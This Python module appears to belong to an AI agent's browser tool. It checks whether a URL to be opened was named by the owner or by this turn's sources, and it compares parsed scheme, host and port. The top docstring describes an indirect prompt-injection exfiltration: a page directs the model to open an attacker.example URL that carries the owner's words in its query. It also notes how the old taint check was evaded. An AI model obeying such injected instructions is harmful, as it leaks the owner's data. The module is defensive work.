"""Whether a web address was named by the owner or by this turn's sources, compared as parsed URLs.

browser_open used to go to any address the model chose, without asking, because opening a page
changes nothing on the machine. Under indirect injection that is an exfiltration channel: a page
or search result tells the model to open https://attacker.example/?q=<what the owner said>, and
the request carries it out. The taint check in the tool loop needs a 24-character match, so a short
host with the data in its query passed it.

An address is trusted only when its scheme, host and port match an address the owner said or that
a source this turn returned. The comparison is on parsed parts, never on substrings: a source that
mentions "example.com" does not make "example.com.evil.net" trusted, and "https://example.com@evil.net"
is a visit to evil.net. An address that carries a user name or password is never trusted.
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass

# A full address, or a bare host the way people say and write one ("github.com", "docs.python.org/3").
_ADDRESS = re.compile(
    r"https?://[^\s<>\"'()\[\]{}]+"
    r"|(?<![\w@.-])(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}(?::\d{1,5})?(?:/[^\s<>\"'()\[\]{}]*)?",
    re.IGNORECASE,
)
_DEFAULT_PORT = {"http": 80, "https": 443}


@dataclass(frozen=True)
class Origin:
    """The parts of an address that decide where a request goes."""

    scheme: str
    host: str
    port: int


def origin(url: str) -> Origin | None:
    """Scheme, host and port of *url* as the browser would visit it; None if it has user info or no host.

    A bare host gets https://, as browser_open gives it.
    """
    text = url.strip()
    if "://" not in text:
        text = "https://" + text
    try:
        parts = urllib.parse.urlsplit(text)
        port = parts.port
    except ValueError:
        return None
    if parts.scheme.lower() not in _DEFAULT_PORT or not parts.hostname:
        return None
    # "https://example.com@evil.net" goes to evil.net; a user name is never what the owner meant.
    if parts.username is not None or parts.password is not None or "@" in parts.netloc:
        return None
    host = parts.hostname.rstrip(".").lower()
    try:
        host = host.encode("idna").decode("ascii")
    except UnicodeError:
        return None
    if host.startswith("www."):
        host = host[4:]
    scheme = parts.scheme.lower()
    return Origin(scheme, host, port or _DEFAULT_PORT[scheme])


def origins_in(text: str) -> set[Origin]:
    """Every address *text* names, parsed. Text that only contains an address as part of a longer host names nothing."""
    found = set()
    for match in _ADDRESS.findall(text or ""):
        parsed = origin(match.rstrip(".,;:!?"))
        if parsed is not None:
            found.add(parsed)
    return found


def untrusted(url: str, owner_text: str, source_texts: list[str]) -> str | None:
    """Why *url* needs the owner's yes, or None when the owner or this turn's sources named it.

    Scheme, host and port must all match one named address. A bare "example.com" counts as
    https://example.com, so http://example.com is not trusted unless http was what was named.
    """
    target = origin(url)
    if target is None:
        return "it is not a plain http or https address (it has no host, another scheme, or a user name)"
    named = origins_in(owner_text)
    for text in source_texts:
        named |= origins_in(text)
    if target in named:
        return None
    return f"neither you nor this turn's sources named {target.host}"
